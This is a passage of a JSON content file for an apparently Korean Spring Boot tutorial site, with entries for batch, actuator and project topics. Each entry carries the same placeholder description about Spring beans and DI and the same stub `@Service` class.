        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "18_배치/batch-intro": {
    "id": "18_배치/batch-intro",
    "title": "Batch Intro",
    "category": "spring",
    "subCategory": "18_배치",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Batch Intro",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "19_모니터링/actuator": {
    "id": "19_모니터링/actuator",
    "title": "Actuator",
    "category": "spring",
    "subCategory": "19_모니터링",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Actuator",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "index": {
    "id": "index",
    "title": "Spring Boot 완전 정복",
    "category": "spring",
    "subCategory": null,
    "language": "Text",
    "description": "",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Boot 완전 정복",
        "content": ""
      },
      {
        "type": "code",
        "language": "Text",
        "code": ""
      }
    ]
  },
  "프로젝트/project-board": {
    "id": "프로젝트/project-board",
    "title": "Project Board",
    "category": "spring",
    "subCategory": "프로젝트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Project Board",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "프로젝트/project-shopping": {
    "id": "프로젝트/project-shopping",
    "title": "Project Shopping",
    "category": "spring",
    "subCategory": "프로젝트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Project Shopping",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  }
}